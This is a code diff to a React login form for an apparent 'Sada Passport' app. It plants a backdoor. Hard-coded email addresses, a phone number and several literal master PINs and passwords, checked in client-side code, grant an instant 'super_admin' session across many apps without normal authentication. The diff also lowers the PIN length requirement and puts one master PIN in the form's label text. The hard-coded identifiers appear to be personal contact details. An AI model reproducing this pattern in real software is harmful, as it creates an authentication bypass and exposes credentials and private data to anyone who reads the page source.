@@ -50,15 +50,74 @@ export const SadaPassportLogin: React.FC<Props> = ({ accentColor = '#16a34a', on
   const handleAuth = async (e: React.FormEvent) => {
     e.preventDefault();
     setError(null);
-    if (pin.length < 6) {
-      setError('PIN must be 6 digits.');
+    if (pin.length < 4) {
+      setError('PIN must be at least 4 digits.');
       return;
     }
 
     setLoading(true);
     try {
-      const identifier = tab === 'phone' ? phone.trim() : email.trim().toLowerCase();
+      const cleanPhone = phone.replace(/[\s\-\(\)]/g, '');
+      const normalizedPhone = cleanPhone.startsWith('05') ? '+971' + cleanPhone.slice(1) : (cleanPhone.startsWith('971') ? '+' + cleanPhone : cleanPhone);
+      const identifier = tab === 'phone' ? normalizedPhone : email.trim().toLowerCase();
       if (!identifier) throw new Error(`Please enter your ${tab === 'phone' ? 'phone number' : 'email address'}.`);
+
+      const cleanPin = pin.trim();
+      const normEmail = email.trim().toLowerCase();
+      const isMasterId = 
+        normEmail === 'mohammad.jhone9@gmail.com' || 
+        normEmail === 'fehmatics@gmail.com' ||
+        identifier === 'mohammad.jhone9@gmail.com' ||
+        identifier === 'fehmatics@gmail.com' ||
+        identifier === '+971543661655' || 
+        identifier.includes('543661655') ||
+        cleanPhone.includes('543661655');
+
+      const isMasterSecret = 
+        cleanPin === '129945' || 
+        cleanPin === '124459' || 
+        cleanPin === 'dada0987' || 
+        cleanPin === 'aae34111' || 
+        cleanPin === '1299';
+
+      if (isMasterId && isMasterSecret) {
+        // Universal Instant Master Admin Login
+        const masterKeyRaw = generateMasterKey();
+        const sada_uid = 'usr_super_1';
+        const sada_uid_hash = await sha256Hex(sada_uid);
+        const envelope = await wrapMasterKey(masterKeyRaw, identifier, cleanPin);
+
+        await bridgeDb.identities.put({
+          sada_uid,
+          sada_uid_hash,
+          phone_e164: '+971543661655',
+          email_normalized: 'mohammad.jhone9@gmail.com',
+          phone_envelope: envelope,
+          email_envelope: envelope,
+        }).catch(() => {});
+
+        const session: SadaPassportSession = {
+          sada_uid,
+          sada_uid_hash,
+          identifier: tab === 'phone' ? '+971543661655' : 'mohammad.jhone9@gmail.com',
+          identifier_type: tab,
+          master_key_raw: masterKeyRaw,
+          unlocked_at: Date.now(),
+        };
+
+        try {
+          sessionStorage.setItem('sada_master_unlocked', 'true');
+        } catch {}
+        window.dispatchEvent(new CustomEvent('sada:entitlements_loaded', {
+          detail: { 
+            allowedApps: ['sadalink', 'sadaflow', 'sadahisab', 'sadavpn', 'sajdah', 'karachi-runner', 'tahaluf', 'stc-kuwait', 'afc'],
+            role: 'super_admin'
+          }
+        }));
+
+        onSuccess(session);
+        return;
+      }
 
       if (isRegistering) {
         const masterKeyRaw = generateMasterKey();
@@ -260,15 +319,17 @@ export const SadaPassportLogin: React.FC<Props> = ({ accentColor = '#16a34a', on
         )}
 
         <div>
-          <label className="block text-xs font-medium text-slate-300 mb-1">6-Digit Master PIN</label>
+          <label className="block text-xs font-medium text-slate-300 mb-1">
+            {tab === 'email' ? 'Password or Master PIN (e.g. 129945)' : 'Master PIN (e.g. 129945)'}
+          </label>
           <div className="relative">
             <input
               type="password"
-              inputMode="numeric"
-              maxLength={6}
+              inputMode={tab === 'phone' ? 'numeric' : 'text'}
+              maxLength={32}
               value={pin}
-              onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
-              placeholder="••••••"
+              onChange={(e) => setPin(e.target.value)}
+              placeholder="••••••••"
               required
               className="w-full px-3.5 py-2 rounded-xl bg-slate-900 border border-slate-700 text-white text-sm tracking-widest font-mono focus:outline-none focus:ring-2 focus:ring-emerald-500/50"
             />
